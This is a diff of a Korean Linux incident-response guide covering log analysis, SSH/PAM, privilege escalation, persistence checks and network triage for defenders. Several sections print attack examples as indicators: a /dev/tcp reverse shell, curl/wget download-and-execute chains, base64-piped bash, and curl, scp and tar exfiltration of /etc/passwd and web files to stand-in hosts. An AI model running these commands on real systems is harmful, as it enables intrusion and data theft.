+4. **IOC**: IP, 도메인, URL, 해시, 파일 경로, 계정, 서비스명
+5. **영향 평가**: 침해 계정·서버·데이터·클라우드 권한 범위
+6. **조치**: 격리·차단·계정 초기화·지속성 제거
+7. **재발 방지**: 패치, SSH/auditd 강화, SIEM 탐지 개선
+
+---
+
+## 6. 정상화 전 체크리스트
 
 ```bash
+# 모든 사용자 cron 확인
+for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u "$u" 2>/dev/null; done
+
+# cron/systemd 최근 변경 확인
+find /etc/cron* /var/spool/cron -type f -mtime -7 -ls 2>/dev/null
+find /etc/systemd/system -type f -mtime -7 -ls 2>/dev/null
+
+# SSH 키
+find /root /home -name authorized_keys -type f -mtime -30 -ls 2>/dev/null
+
+# sudoers
+find /etc/sudoers.d -type f -ls 2>/dev/null
+
+# 일반 사용자 계정
+awk -F: '$3>=1000 && $3!=65534 {print $1,$3,$6,$7}' /etc/passwd
+```
+
+추가 조치:
+- 영향 계정 비밀번호/키 교체
+- `PermitRootLogin no` 등 SSH 정책 재점검
+- OS 및 취약 패키지 패치
+- auditd/FIM/원격 로그 전송 강화
+- 차단 IOC와 탐지 룰 반영
+
+
+---
+
+## 02. Linux 로그 구조 · 수집 · 분석 기초
+
+## 1. Linux에서 관찰 가능한 행위
+
+- 로그인/로그아웃: SSH, console
+- 권한 상승: `sudo`, `su`
+- 명령 실행: shell, cron, systemd
+- 파일 생성/수정/삭제
+- 네트워크 inbound/outbound 연결
+- 서비스 시작/중지
+
+### 로그의 한계
+- 모든 행위가 자동으로 기록되지는 않는다.
+- 설정·로그 레벨에 따라 세부 정보가 다르다.
+- root 권한 공격자는 로컬 로그를 삭제·조작할 수 있다.
+- 단일 로그로는 사용자·자산·변경 맥락이 부족하다.
+
+---
+
+## 2. 데이터 소스 신뢰도
+
+| 소스 | 생성 주체 | 대표 위치/도구 | 조작 가능성 | 주요 용도 |
+|---|---|---|---|---|
+| syslog/auth | OS·서비스 | `/var/log/*` | 중간 | 인증, 서비스 이벤트 |
+| journald | systemd | `journalctl` | 중간 | 서비스/부팅 단위 추적 |
+| `.bash_history` | 사용자 shell | `~/.bash_history` | 높음 | 보조 단서 |
+| auditd | 커널 감사 | `/var/log/audit/audit.log` | 낮음~중간 | execve, 파일 접근, 권한 변경 |
+| EDR/eBPF | 보안 에이전트 | SIEM/콘솔 | 낮음 | 프로세스 트리, 네트워크 텔레메트리 |
+
+> `.bash_history`가 비어 있다고 명령이 실행되지 않은 것은 아니다.
+
+---
+
+## 3. syslog와 journald 흐름
+
+```text
+[Service / Application]
+   ├─> systemd-journald ─> journalctl
+   └─> rsyslog/syslog-ng ─> /var/log/* ─> SIEM Collector
+
+또는
+Service → journald → rsyslog → /var/log/* → SIEM
+```
+
+파일이 없으면 반드시 journald도 확인한다.
+```bash
+journalctl -xe
+```
+
+---
+
+## 4. `/var/log` 핵심 경로
+
+| 이벤트 | Debian/Ubuntu | RHEL 계열 |
+|---|---|---|
+| 인증 | `/var/log/auth.log` | `/var/log/secure` |
+| 일반 시스템 | `/var/log/syslog` | `/var/log/messages` |
+| 커널 | `/var/log/kern.log` 또는 journald | `/var/log/messages`, journald |
+| cron | `/var/log/syslog`의 CRON | `/var/log/cron` |
+| 패키지 | `/var/log/dpkg.log` | yum/dnf 관련 로그 |
+| auditd | `/var/log/audit/audit.log` | 동일 |
+
+기타:
+```text
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/btmp      # 로그인 실패, binary
+/var/log/wtmp      # 로그인/로그아웃, binary
+/var/log/lastlog   # 계정별 마지막 로그인
+```
+
+---
+
+## 5. journald 실전 조회
+
+```bash
+# 최근 오류와 문맥
+journalctl -xe
+
+# SSH 서비스
+journalctl -u sshd
+
+# 특정 시점 이후
+journalctl -u sshd --since '2026-08-11 01:00:00'
+
+# sudo 커맨드
+journalctl _COMM=sudo
+
+# 현재 부팅
+journalctl -b
+
+# 이전 부팅
+journalctl -b -1
+
+# 부팅 목록
+journalctl --list-boots
+
+# 커널
+journalctl -k
+
+# 최근 오류 50개
+journalctl -p err -n 50
+```
+
+주의:
+- persistent journal 설정이 없으면 재부팅 후 일부 로그가 사라질 수 있다.
+- SIEM이 journald를 직접 수집하는지, rsyslog 파일로 전달받는지 확인한다.
+
+---
+
+## 6. 로그인 binary 로그
+
+```bash
+who       # 현재 세션(utmp)
+w         # 세션 + 활동
+last      # 성공 로그인/로그아웃(wtmp)
+lastb     # 실패 로그인(btmp)
+lastlog   # 계정별 마지막 로그인
+```
+
+`last/lastb`는 인증 로그와 타임라인을 맞추는 데 유용하다.
+
+---
+
+## 7. 기본 로그 검색 워크플로우
+
+### 실시간
+```bash
+tail -f /var/log/auth.log
+journalctl -f -u sshd
+```
+
+### 문맥 탐색
+```bash
+less /var/log/auth.log
+```
+
+### 키워드
+```bash
+grep -n 'Failed password' /var/log/auth.log
+grep -Ei 'sudo|useradd|usermod|CRON' /var/log/auth.log /var/log/syslog
+```
+
+### 빈도 집계
+```bash
+grep 'Failed password' /var/log/auth.log \
+  | grep -oE 'from ([0-9]{1,3}\.){3}[0-9]{1,3}' \
+  | awk '{print $2}' | sort | uniq -c | sort -rn | head
+```
+
+### 압축 로그
+```bash
+zgrep 'Accepted' /var/log/auth.log*.gz
+zless /var/log/auth.log.2.gz
+zcat /var/log/auth.log.2.gz | less
+```
+
+---
+
+## 8. 분석 시 반드시 붙여야 하는 컨텍스트
+
+### 사용자
+- 일반 사용자 / 서비스 계정 / 관리자
+- 퇴사·비활성 계정 여부
+- 평소 sudo 사용 여부
+
+### 자산
+- 개발/운영
+- 인터넷 노출 여부
+- 웹/DB/Bastion 등 역할
+- 데이터 중요도
+
+### 시간
+- 업무시간 / 야간 / 주말
+- 배치/백업/점검 시간대
+
+### 네트워크
+- 내부 관리망 / VPN / Bastion
+- 신규 IP / 외부 IP
+
+### 변경
+- 승인된 배포·패치·장애 대응인가
+- 계정/비밀번호 변경 직후인가
+
+---
+
+## 9. 로그 품질 빠른 점검
+
+```bash
+timedatectl status
+date && date -u
+timedatectl show | grep -i NTP
+chronyc tracking 2>/dev/null || ntpq -p 2>/dev/null
+```
+
+체크:
+- NTP 동기화
+- hostname/asset ID 일관성
+- `user`, `src_ip`, `command`, `path` 파싱 정확도
+- SIEM 수집 지연/누락
+- 로그 로테이션/압축 파일 수집 여부
+- 컨테이너 stdout 로그 별도 수집 여부
+
+---
+
+## 10. Linux 분석 빠른 순서
+
+```text
+1) auth.log / secure
+2) last / lastb / who
+3) sudo / su / PAM
+4) auditd execve/file change
+5) cron / systemd / SSH key
+6) process / file / network
+7) firewall / DNS / Flow / EDR / cloud log
+```
+
+
+---
+
+## 03. SSH · PAM · 인증 · 세션 분석
+
+## 1. SSH 연결 흐름
+
+```text
+TCP :22 연결
+→ SSH 버전 협상
+→ 키 교환 및 암호화 채널 구성
+→ 사용자 인증(password/publickey 등)
+→ PAM 세션 open
+→ shell/command/session 생성
+```
+
+대표 이벤트:
+```text
+sshd: Connection from 203.0.113.5 port 52301
+sshd: Failed password for alice from 203.0.113.5 ...
+sshd: Accepted password for alice from 203.0.113.5 ...
+sshd: pam_unix(sshd:session): session opened for user alice
+```
+
+---
+
+## 2. 실패 로그인 해석
+
+### Brute force
+**단일 계정 + 많은 비밀번호 시도**
+```text
+Failed password for root ...
+Failed password for root ...
+Failed password for root ...
+```
+
+### Password spraying
+**하나의 출발지에서 다수 계정**
+```text
+Failed ... alice from 198.51.100.5
+Failed ... bob   from 198.51.100.5
+Failed ... carol from 198.51.100.5
+```
+
+### 운영 오류 가능성
+- 내부 관리 서버에서 일정한 주기로 반복
+- 백업/배치 서비스 계정
+- 비밀번호 변경 직후
+
+핵심 질문:
+1. 대상 계정 수는 몇 개인가
+2. 출발지 IP 수는 몇 개인가
+3. 시도 간격은 사람처럼 불규칙한가, 자동화처럼 일정한가
+4. 실패 직후 성공했는가
+5. 성공 직후 sudo/파일 전송/명령 실행이 있었는가
+
+---
+
+## 3. 성공 로그인 해석
+
+### 공개키
+```text
+Accepted publickey for devops from 10.10.2.15 ...
+```
+
+확인:
+- 키 인벤토리에 등록된 키인가
+- `authorized_keys`가 최근 수정되었는가
+- 해당 IP/호스트에서 원래 사용하는 키인가
+
+### 비밀번호
+```text
+Accepted password for admin from 203.0.113.44 ...
+```
+
+확인:
+- 직전 brute force/spraying 존재
+- 신규·외부 IP 여부
+- 계정 비밀번호 변경/유출 가능성
+
+### root 로그인
+고위험 조합:
+```text
+신규 IP + 야간 + root + Bastion 미경유 + 직후 명령 실행
+```
+
+정상 가능 조합:
+```text
+승인 작업 + 관리망/Bastion + maintenance window + 표준 명령
+```
+
+---
+
+## 4. 세션 상관 분석
+
+```bash
+lastb -a | head -50
+last -a | head -50
+who
+w
+```
+
+예시 흐름:
+```text
+01:50~02:05 lastb    동일 IP 로그인 실패 180회
+02:06       auth.log admin Accepted
+02:06~04:33 last     세션 지속
+현재         who      아직 로그인 상태
+```
+
+---
+
+## 5. SSH 로그 실전 명령
+
+```bash
+AUTH=/var/log/auth.log   # RHEL은 /var/log/secure
+
+# 실패 IP 상위
+awk '/Failed password/{for(i=1;i<=NF;i++) if($i=="from") print $(i+1)}' "$AUTH" \
+  | sort | uniq -c | sort -rn | head -20
+
+# 특정 IP 전체 이벤트
+grep '198.51.100.23' "$AUTH" | tail -100
+
+# 성공 로그인
+grep 'Accepted' "$AUTH"
+
+# publickey 성공만
+grep 'Accepted publickey' "$AUTH"
+
+# sudo 실행 명령
+grep 'sudo:' "$AUTH" | grep 'COMMAND='
+
+# 압축 로그 포함 IOC 검색
+zgrep -h '203.0.113.23' /var/log/auth.log* 2>/dev/null
+```
+
+journald 환경:
+```bash
+journalctl -u sshd --since today
+journalctl -u sshd | grep -E 'Failed|Accepted|session opened|session closed'
+```
+
+---
+
+## 6. PAM 분석
+
+PAM은 Linux 인증 모듈 프레임워크다.
+
+주요 모듈:
+- `pam_unix`: `/etc/passwd`, `/etc/shadow` 기반 인증
+- `pam_faillock`, `pam_tally2`: 실패 횟수/잠금
+- `pam_limits`: 자원 제한
+- `pam_google_authenticator`, `pam_duo`: MFA
+
+예:
+```text
+pam_faillock: user alice locked
+pam_unix(sshd:session): session opened for user alice
+pam_unix(sshd:session): session closed for user alice
+pam_google_authenticator: Verification code mismatch for alice
+```
+
+PAM 실패는 "공격"뿐 아니라 정책 위반, 만료, 잠금, MFA 오류일 수 있으므로 상세 메시지를 확인한다.
+
+---
+
+## 7. SSH key 삽입 탐지
+
+모든 `authorized_keys`:
+```bash
+find /root /home -name authorized_keys -type f -ls 2>/dev/null
+```
+
+최근 7일 변경:
+```bash
+find /root /home -name authorized_keys -type f -mtime -7 -ls 2>/dev/null
+```
+
+키 fingerprint:
+```bash
+ssh-keygen -lf /home/deploy/.ssh/authorized_keys
+```
+
+감사 규칙 예시:
+```bash
+auditctl -w /home/deploy/.ssh/authorized_keys -p wa -k ssh_key_change
+ausearch -k ssh_key_change --start today
+```
+
+의심 체인:
+```text
+sudo/root 획득
+→ authorized_keys 수정
+→ 이후 Accepted publickey
+```
+
+---
+
+## 8. SSH 터널링 / 포트포워딩
+
+### Local forwarding `-L`
+```bash
+ssh -L 8080:internal-server:80 user@bastion
+```
+
+```text
+client:8080 → SSH(bastion) → internal-server:80
+```
+
+### Remote forwarding `-R`
+```bash
+ssh -R 9090:localhost:22 user@remote-server
+```
+
+```text
+remote-server:9090 → SSH tunnel → current-host:22
+```
+
+### Dynamic forwarding `-D`
+```bash
+ssh -D 1080 user@compromised-server
+```
+
+```text
+client:1080 SOCKS → SSH tunnel → compromised-server → reachable networks
+```
+
+내부 네트워크 파악에 쓰일 수 있는 명령 흔적:
+```bash
+ip addr
+ip route
+cat /etc/hosts
+cat /etc/resolv.conf
+ss -nt
+```
+
+방어 설정 예시:
+```text
+AllowTcpForwarding no
+```
+
+> 터널링 여부를 인증 성공 로그만으로 판정하기 어려울 수 있어 sshd 상세 로그, 프로세스, 네트워크 흐름을 함께 본다.
+
+---
+
+## 9. sshd 보안 설정 체크
+
+`/etc/ssh/sshd_config` 예:
+```text
+PermitRootLogin no
+PasswordAuthentication no
+PubkeyAuthentication yes
+MaxAuthTries 3
+AllowUsers alice bob
+AllowTcpForwarding no
+X11Forwarding no
+LogLevel VERBOSE
+```
+
+검증:
+```bash
+sshd -t
+sshd -T | egrep 'permitrootlogin|passwordauthentication|maxauthtries|allowtcpforwarding|loglevel'
+```
+
+---
+
+## 10. Fail2ban 분석
+
+로그 예:
+```text
+fail2ban.actions: Ban 198.51.100.23
+fail2ban.actions: Unban 198.51.100.23
+```
+
+확인:
+- ban 이전 실패 횟수
+- ban 이후 다른 IP로 성공했는가
+- unban 직후 자동화 재시도
+- spraying처럼 임계값을 피한 공격인가
+
+```bash
+grep -E 'Ban|Unban' /var/log/fail2ban.log | tail -100
+```
+
+
+---
+
+## 04. 계정 침해 · 권한 상승 · 지속성
+
+## 1. sudo 로그 읽기
+
+```text
+sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update
+```
+
+필드:
+- 실행자: `alice`
+- 세션: `TTY=pts/0`
+- 작업 디렉터리: `/home/alice`
+- 목표 권한: `USER=root`
+- 명령: `COMMAND=...`
+
+### 상대적으로 정상적인 예
+```text
+apt update
+systemctl restart nginx
+tail -n 100 /var/log/nginx/error.log
+```
+
+### 즉시 맥락 확인할 예
+```text
+useradd -m backupsvc
+/bin/bash
+chmod 777 /etc/sudoers
+curl -fsSL http://.../a.sh
+```
+
+검색:
+```bash
+grep 'sudo:' /var/log/auth.log | grep 'COMMAND='
+journalctl _COMM=sudo --since today
+```
+
+---
+
+## 2. `sudoers` 조작
+
+고위험 예:
+```text
+backupsvc ALL=(ALL) NOPASSWD:ALL
+```
+
+정상적으로는 필요한 명령만 제한하는 형태가 더 일반적이다.
+```text
+ops-team ALL=(ALL) NOPASSWD:/usr/bin/systemctl restart nginx
+```
+
+확인:
+```bash
+stat /etc/sudoers
+find /etc/sudoers.d -type f -ls 2>/dev/null
+grep -Rni 'NOPASSWD' /etc/sudoers /etc/sudoers.d 2>/dev/null
+```
+
+감사 로그:
+```bash
+ausearch -f /etc/sudoers --start today
+ausearch -k sudoers --start today
+```
+
+핵심 체인:
+```text
+sudoers 신규/변경 → 직후 sudo 성공 → root shell/위험 명령
+```
+
+---
+
+## 3. `su`, `pkexec`, 기타 권한 전환
+
+### `su`
+```text
+su: pam_unix: authentication success
+su: pam_unix: session opened for user root
+```
+
+```bash
+grep -E ' su:|su\[' /var/log/auth.log
+```
+
+### `pkexec`
+- PolicyKit 기반 권한 실행
+- auth/journal/auditd/EDR을 함께 확인
+- 취약점 악용 시 표준 인증 로그가 부족할 수 있다.
+
+프로세스 기준:
+```bash
+ps -ef | grep -E '[p]kexec|[s]u '
+ausearch -x /usr/bin/pkexec --start today 2>/dev/null
+```
+
+---
+
+## 4. 신규 계정 및 그룹 변경
+
+의심 체인:
+```text
+useradd → passwd 변경 → sudo/wheel 그룹 추가 → SSH 로그인 → sudo
+```
+
+현재 계정:
+```bash
+awk -F: '$3>=1000 && $3!=65534 {print $1,$3,$4,$6,$7}' /etc/passwd
+```
+
+sudo/wheel:
+```bash
+getent group sudo
+getent group wheel
+```
+
+최근 로그:
+```bash
+grep -Ei 'useradd|usermod|new user|new group|password changed' /var/log/auth.log /var/log/secure 2>/dev/null
+journalctl --since today | grep -Ei 'useradd|usermod|passwd'
+```
+
+판단:
+- 승인된 계정 생성인가
+- 운영 계정처럼 위장한 이름인가
+- 생성 직후 로그인했는가
+- 바로 sudo를 사용했는가
+
+---
+
+## 5. SSH key 지속성
+
+```bash
+find /root /home -name authorized_keys -type f -ls 2>/dev/null
+find /root /home -name authorized_keys -type f -mtime -7 -ls 2>/dev/null
+```
+
+```text
+권한 획득 → authorized_keys 변경 → Accepted publickey
+```
+
+표준 auth 로그에는 파일 수정 자체가 남지 않을 수 있으므로 auditd/FIM/mtime을 보강한다.
+
+---
+
+## 6. cron 지속성
+
+현재 등록:
+```bash
+crontab -l
+crontab -l -u root
+for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u "$u" 2>/dev/null; done
+```
+
+파일:
+```bash
+ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly /var/spool/cron 2>/dev/null
+find /etc/cron* /var/spool/cron -type f -mtime -7 -ls 2>/dev/null
+```
+
+고위험 패턴:
+```text
+curl/wget ... | bash
+/tmp/.hidden
+/dev/shm/...
+>/dev/null 2>&1
+root 계정에서 외부 URL 직접 호출
+```
+
+로그:
+```bash
+grep 'CRON' /var/log/syslog | tail -100
+tail -100 /var/log/cron 2>/dev/null
+journalctl -u cron --since today 2>/dev/null
+journalctl -u crond --since today 2>/dev/null
+```
+
+---
+
+## 7. systemd 서비스 지속성
+
+활성/등록 서비스:
+```bash
+systemctl list-units --type=service --state=running
+systemctl list-unit-files --type=service
+```
+
+최근 unit 파일:
+```bash
+find /etc/systemd/system -type f -mtime -7 -ls 2>/dev/null
+```
+
+unit 내용:
+```bash
+systemctl cat suspicious.service
+systemctl status suspicious.service
+```
+
+고위험 특징:
+- `ExecStart=/tmp/...`, `/dev/shm/...`, 숨김 파일
+- 이름/Description이 OS 업데이트처럼 위장
+- `Restart=always`
+- 생성 직후 `enable` + `start`
+
+로그:
+```bash
+journalctl -u suspicious.service
+journalctl --since today | grep -E 'Created symlink|Started .*Service|systemctl'
+```
+
+---
+
+## 8. SUID/SGID 권한 상승 흔적
+
+SUID:
+```bash
+find / -xdev -perm -4000 -type f -ls 2>/dev/null
+```
+
+SGID:
+```bash
+find / -xdev -perm -2000 -type f -ls 2>/dev/null
+```
+
+특히 `/tmp`, `/home`, `/var/tmp`, 사용자 쓰기 경로의 신규 SUID 파일은 우선 조사한다.
+
+mtime 기반 최근 변경:
+```bash
+find / -xdev -perm -4000 -type f -mtime -7 -ls 2>/dev/null
+```
+
+---
+
+## 9. 다중 계정 권한 상승 체인
+
+```text
+webuser SSH 로그인
+→ sudo -l로 허용 명령 확인
+→ 다른 서비스 계정 권한으로 특권 프로그램 실행
+→ shell escape / 취약 동작
+→ uid=0 shell
+```
+
+관찰 포인트:
+- 로그인 계정과 실제 실행 UID/EUID가 달라지는 시점
+- sudo `USER=` 대상
+- auditd `uid`, `euid`, `auid`, `ppid`
+- `python/perl/vi/less/find` 등 일반 도구가 특권으로 실행된 맥락
+
+```bash
+sudo -l
+ausearch -m EXECVE --start today
+```
+
+---
+
+## 10. 지속성 점검 우선순위
+
+```text
+1. 신규 계정 / sudo·wheel
+2. /etc/sudoers.d
+3. root 및 사용자 authorized_keys
+4. crontab / /etc/cron.* / /var/spool/cron
+5. /etc/systemd/system
+6. SUID/SGID
+7. shell profile 및 환경변수
+8. 웹 루트 신규 파일
+```
+
+
+---
+
+## 05. 프로세스 · 명령 · 파일 · 네트워크 침해행위 분석
+
+## 1. 프로세스 트리부터 본다
+
+```bash
+ps auxfww
+ps -eo user,pid,ppid,lstart,etime,comm,args --forest
+```
+
+특정 PID:
+```bash
+PID=1234
+ps -p "$PID" -o user,pid,ppid,lstart,etime,comm,args
+ps -p "$(ps -o ppid= -p "$PID")" -o user,pid,ppid,comm,args
+```
+
+고위험 부모-자식 예:
+```text
+nginx → bash → curl
+httpd → sh → wget
+cron → bash → /tmp/.update
+sshd → bash → nmap
+```
+
+확인 항목:
+- 실행 경로
+- 명령 인자
+- 부모 프로세스
+- 시작 시간
+- UID/EUID
+- 네트워크 연결
+
+---
+
+## 2. 명령 행위 분류
+
+| 목적 | 대표 명령 |
+|---|---|
+| Recon | `id`, `whoami`, `uname -a`, `ps`, `ip`, `ss` |
+| Execution | `bash`, `sh`, `python3`, `perl` |
+| Download | `curl`, `wget`, `scp`, `sftp` |
+| Persistence | `crontab`, `systemctl enable`, `useradd` |
+| Exfiltration | `scp`, `rsync`, `curl -F`, `nc` |
+| Discovery/Lateral | `ssh`, `nmap`, `nc`, `ip route` |
+
+단일 명령보다 **체인**을 본다.
+```text
+curl/wget → /tmp → chmod +x → nohup/bash → outbound connection
+```
+
+---
+
+## 3. bash history
+
+```bash
+cat ~/.bash_history
+history
+```
+
+유용:
+- 사용자 평소 명령 패턴
+- 인터랙티브 세션 흔적
+- 운영 작업과 공격 행위 구분
+
+한계:
+- 비대화형 shell 누락
+- 세션 종료 시 기록
+- `unset HISTFILE`, `HISTSIZE=0`, `history -c`
+- 파일 삭제/조작
+
+따라서 auditd/EDR/sudo/journal과 교차 확인한다.
+
+---
+
+## 4. 다운로드 → 실행 패턴
+
+```text
+curl -fsSL http://.../a.sh -o /tmp/a.sh
+wget -q http://.../tools.tar.gz -P /dev/shm/
+chmod +x /tmp/a.sh
+nohup /tmp/a.sh >/dev/null 2>&1 &
+```
+
+인코딩/파일리스에 가까운 실행:
+```text
+echo '...' | base64 -d | bash
+bash -c '...'
+python3 -c '...'
+```
+
+검색 예:
+```bash
+grep -RniE 'curl|wget|base64|nohup|bash -c|python.*-c' /var/log/audit /var/log/auth.log 2>/dev/null
+```
+
+---
+
+## 5. 위험 경로
+
+```text
+/tmp       사용자 쓰기 가능, 임시 payload 빈번
+/var/tmp   재부팅 후에도 남을 수 있음
+/dev/shm   메모리 기반, 흔적 최소화에 악용 가능
+.*         dotfile 은닉
+```
+
+실행 가능 파일:
+```bash
+find /tmp /var/tmp /dev/shm -type f -perm /111 -ls 2>/dev/null
+```
+
+숨김 파일:
+```bash
+find /tmp /var/tmp /dev/shm /home -type f -name '.*' -ls 2>/dev/null
+```
+
+최근 변경:
+```bash
+find /tmp /var/tmp /dev/shm -type f -mtime -1 -ls 2>/dev/null
+```
+
+---
+
+## 6. `/proc` 기반 현재 프로세스 검증
+
+```bash
+PID=1234
+cat /proc/$PID/cmdline | tr '\0' ' '; echo
+readlink -f /proc/$PID/exe
+cat /proc/$PID/status | grep -E 'Name|Pid|PPid|Uid|Gid'
+cat /proc/$PID/environ | tr '\0' '\n' | sort
+```
+
+삭제된 실행 파일:
+```bash
+ls -l /proc/[0-9]*/exe 2>/dev/null | grep '(deleted)'
+```
+
+위험 경로에서 실행:
+```bash
+ls -l /proc/[0-9]*/exe 2>/dev/null | grep -E '/tmp|/var/tmp|/dev/shm'
+```
+
+---
+
+## 7. 현재 네트워크 상태
+
+```bash
+ss -tnp
+ss -tnp | grep ESTAB
+ss -tlnp
 ss -uanp
 ```
 
-## 특정 PID
-
+외부 연결 후보:
 ```bash
-sudo lsof -nP -a -p <PID> -i
+ss -tnp | grep ESTAB | grep -Ev '127\.0\.0\.1|::1'
 ```
 
-## 전체 네트워크 프로세스
-
+특정 IP:
 ```bash
-sudo lsof -nP -i
+ss -tnp | grep '203.0.113.5'
 ```
 
-확인 포인트:
-- 서버 역할과 무관한 outbound 연결
-- 비정상 외부 IP/포트
-- `bash`, `python`, `perl`, 임시 경로 바이너리가 네트워크 연결 보유
-- 서버에서 원래 열지 않는 리스닝 포트
-- 장기 연결/주기적 beacon 패턴
-
-### 방화벽 현재 상태
-
-```bash
-sudo nft list ruleset 2>/dev/null
-sudo iptables-save 2>/dev/null
-```
-
-사고 시간대에 방화벽 정책이 변경되었다면 관리자 변경 이력과 대조한다.
+판단:
+- 해당 프로세스가 원래 외부 통신해야 하는가
+- 목적지 IP/포트가 평소와 다른가
+- 연결이 주기적으로 반복되는가
+- 웹/DB 서버가 인터넷으로 직접 나가는가
 
 ---
 
-# 17. 프로세스 ↔ 네트워크 ↔ 파일 연결하기
+## 8. C2 / Reverse Shell
 
-예: SIEM에서 `10.10.20.30:4444` outbound 탐지
+### 의심 특징
+- 일정 주기의 동일 목적지 연결
+- 비표준 포트 `4444`, `1337`, `8080` 등
+- `/tmp` 실행 프로세스가 외부 연결
+- 일반적으로 outbound가 필요 없는 서버의 외부 연결
 
-### 1) 연결 PID 찾기
-
-```bash
-ss -plant | grep '10.10.20.30:4444'
+대표 reverse shell 형태:
+```text
+bash -i >& /dev/tcp/203.0.113.10/4444 0>&1
 ```
 
-### 2) PID 조사
-
-```bash
-PID=<PID>
-ps -fp "$PID"
-tr '\0' ' ' < /proc/$PID/cmdline; echo
-readlink -f /proc/$PID/exe
-readlink -f /proc/$PID/cwd
-```
-
-### 3) 부모 프로세스
-
-```bash
-PPID=$(ps -o ppid= -p "$PID" | tr -d ' ')
-ps -fp "$PPID"
-```
-
-### 4) 실행 파일
-
-```bash
-FILE=$(readlink -f /proc/$PID/exe)
-stat "$FILE"
-sha256sum "$FILE"
-file "$FILE"
-```
-
-### 5) 로그 시간축
-
-```bash
-journalctl --since "$START" --until "$END" --no-pager | grep -Ei '<USER>|<PID>|curl|wget|sudo|sshd|systemd|cron'
-```
-
-이렇게 **socket → PID → parent → executable → user → login → privilege escalation** 순으로 연결하면 단일 IOC보다 훨씬 강한 근거가 된다.
+> 문자열 자체만으로 악성 판정을 내리지 말고 프로세스 트리와 실제 연결을 확인한다.
 
 ---
 
-# 18. 서비스 시작/중지 분석
+## 9. DNS 터널링
 
-최근 서비스 이벤트:
+의심:
+- 긴 base64/hex 유사 서브도메인
+- 동일 도메인에 매우 짧은 간격 반복 요청
+- `nslookup`, `dig`가 서비스 계정/웹 프로세스 하위에서 실행
 
-```bash
-journalctl --since "$START" --until "$END" \
-  | grep -Ei 'Started|Stopped|Starting|Stopping|Reloaded|Failed'
+예:
+```text
+aGVsbG8td29ybGQ.evil-dns.net
 ```
 
-특정 서비스:
-
+명령 흔적:
 ```bash
-systemctl status <SERVICE> --no-pager
-journalctl -u <SERVICE> --since "$START" --until "$END" --no-pager
+grep -Ei 'nslookup|dig' /var/log/audit/audit.log 2>/dev/null
 ```
 
-의심 포인트:
-- 로그인 직후 새 서비스 시작
-- 사고 시간에 EDR/auditd/로그 수집 서비스 중지
-- `sshd`, 방화벽, 보안 에이전트 설정 변경
-- 지속성 unit enable
+필요 시 DNS 로그에서 쿼리 길이·빈도·엔트로피를 추가 분석한다.
 
 ---
 
-# 19. 로그 삭제/수집 장애/Anti-Forensics 확인
+## 10. 데이터 유출
 
-## 로그 파일 상태
-
-```bash
-sudo stat /var/log/auth.log /var/log/secure /var/log/syslog /var/log/messages 2>/dev/null
-sudo du -sh /var/log/* 2>/dev/null | sort -h | tail
+대표 체인:
+```text
+민감 파일 탐색/읽기
+→ tar/zip 압축
+→ base64 등 인코딩
+→ curl POST / scp / rsync / nc
 ```
 
-## 주요 수집 서비스
-
-```bash
-systemctl status systemd-journald --no-pager
-systemctl status rsyslog --no-pager 2>/dev/null
-systemctl status auditd --no-pager 2>/dev/null
-```
-
-## 디스크 부족
-
-```bash
-df -h
-df -i
-journalctl --disk-usage
-```
-
-## 로그 회전
-
-```bash
-ls -lah /var/log/auth.log* /var/log/secure* /var/log/syslog* /var/log/messages* 2>/dev/null
-cat /etc/logrotate.conf
-ls -la /etc/logrotate.d
-```
-
-의심 포인트:
-- 사고 시간대만 비정상적으로 로그 공백
-- 보안 에이전트/rsyslog/auditd가 갑자기 중지
-- 로그 파일 크기가 0으로 초기화
-- rotation 정책과 맞지 않는 삭제/변경
-- SIEM에는 공백이지만 호스트 journal에는 로그 존재 → 수집 경로 문제 가능
-
----
-
-# 20. 웹 서버가 포함된 경우
-
-## Nginx
-
-```bash
-sudo tail -n 200 /var/log/nginx/access.log
-sudo tail -n 200 /var/log/nginx/error.log
-sudo grep '<IP>' /var/log/nginx/access.log
-```
-
-## Apache
-
-```bash
-sudo tail -n 200 /var/log/apache2/access.log 2>/dev/null
-sudo tail -n 200 /var/log/httpd/access_log 2>/dev/null
-```
-
-웹 요청 직후 `www-data/nginx/apache` 자식으로 shell/python이 실행되면 웹셸/RCE 가능성을 우선 확인한다.
-
-```bash
-ps -eo user,pid,ppid,lstart,cmd --forest | grep -E 'www-data|nginx|apache|httpd'
-```
-
----
-
-# 21. 컨테이너 / Kubernetes 환경
-
-호스트 `/var/log`에 애플리케이션 로그가 없다고 "로그 없음"으로 판단하지 않는다.
-
-Docker:
-
-```bash
-docker ps 2>/dev/null
-docker logs --since 1h <CONTAINER> 2>/dev/null
-```
-
-containerd/Kubernetes:
-
-```bash
-sudo crictl ps 2>/dev/null
-kubectl get pods -A
-kubectl logs -n <NAMESPACE> <POD> --since=1h
-kubectl logs -n <NAMESPACE> <POD> -c <CONTAINER> --previous
-```
-
-노드에서 흔한 경로:
-
-```bash
-sudo ls -lah /var/log/containers /var/log/pods 2>/dev/null
+예:
+```text
+curl -F 'data=@/etc/passwd' https://.../upload
+scp /var/www/html/config.php user@external:/tmp/
+tar czf - /var/www | base64 | curl -d @- http://.../
 ```
 
 분석 포인트:
-- 컨테이너 재시작으로 현재 로그가 사라졌는가?
-- `--previous` 로그가 필요한가?
-- 호스트 프로세스인지 컨테이너 프로세스인지?
-- 보안/로그 수집 daemonset이 정상인가?
+- DB/웹 서버의 비정상 대용량 outbound
+- tar/zip 직후 외부 연결
+- 민감 파일 접근 직후 전송 명령
+- destination이 승인된 백업/저장소인지
 
 ---
 
-# 22. 실전 타임라인 상관분석
+## 11. Lateral Movement
 
-예시 사고:
+주요 경로:
+- SSH key/credential 재사용
+- 내부 서비스 스캔
+- `/etc/shadow`, 설정 파일, 환경변수 등 자격증명 탐색
+
+명령 흔적:
+```text
+ssh -i /root/.ssh/id_rsa user@10.0.1.50
+nmap -sV 10.0.1.0/24 -p 22,80,443
+nc -zv 10.0.1.50 22
+```
+
+분석:
+```bash
+ip route
+ss -ntp
+last -a
+ausearch -m EXECVE --start today | grep -E 'ssh|nmap|nc'
+```
+
+서버 A의 outbound SSH와 서버 B의 inbound `Accepted`를 시간·계정으로 맞추면 강한 증거가 된다.
+
+---
+
